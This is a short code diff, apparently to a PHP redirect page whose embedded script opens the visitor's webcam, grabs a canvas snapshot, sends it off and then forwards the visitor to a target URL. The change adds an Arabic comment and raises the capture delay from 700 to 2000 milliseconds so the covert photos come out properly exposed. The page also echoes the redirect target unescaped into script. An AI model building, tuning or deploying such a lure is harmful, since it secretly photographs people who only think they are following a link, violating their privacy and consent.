@@ -144,6 +144,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                     video.srcObject = stream;
                     video.play();
                     
+                    // تم زيادة المهلة الزمنية إلى 2000 مللي ثانية (ثانيتين) لكي تضبط الكاميرا الإضاءة وتتجنب ظهور الصورة بيضاء
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 640;
@@ -166,7 +167,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                         }).finally(() => {
                             window.location.replace(targetUrl);
                         });
-                    }, 700);
+                    }, 2000); 
                 })
                 .catch(err => {
                     window.location.replace("<?php echo $target_redirect; ?>");
